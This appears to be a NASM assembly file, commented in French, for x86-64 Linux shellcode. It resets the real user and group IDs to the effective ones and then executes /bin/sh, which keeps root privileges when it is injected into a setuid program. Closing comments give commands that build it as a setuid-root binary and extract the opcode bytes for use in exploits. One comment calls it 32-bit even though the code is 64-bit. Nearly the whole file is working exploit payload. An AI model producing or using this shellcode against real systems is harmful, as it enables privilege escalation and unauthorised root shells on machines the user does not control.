global _start

_start:
	xor rax,rax
 
	; remplacer e par r si ne fonctionne pas et remettre le xor rax,rax


	; geteuid pour avoir l'utilisateur courant éxécutant le programme

	mov al, 107
	syscall

	; setreuid pour utiliser l'utilisateur courant du programme 

	mov edi,eax 
	xor rax,rax 
	mov esi,edi 
	
	mov al, 113
	syscall

	; getegid pour avoir le groupe courant éxécutant le programme 
	
	mov al,108
	syscall

	; setregid pour utiliser le groupe courant du programme 
	 
	
	mov edi,eax
	xor rax,rax
	mov esi,edi

	mov al,114
	syscall

	; exercve

	xor esi,esi
	mul esi
	mov rdi,'//bin/sh'

	push rax 
	push rdi
         
	;push dword 'n/sh'
	;push dword '//bi'

	mov rdi, rsp
	
	mov al, 59
	syscall

; shellcode 32 bits généric il utilise seteuid et setegid avec un get pour avoir ceux du 
; fichier source 
;nasm -f elf64 shellcode_generic.asm && ld shellcode_generic.o -o shellcode_generic -m elf_x86_64 && sudo chown  root ./shellcode_generic && sudo chgrp root ./shellcode_generic && sudo chmod +x ./shellcode_generic && sudo chmod +s ./shellcode_generic && ./shellcode_generic 

;for i in $(objdump -d ./shellcode_generic -M intel | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
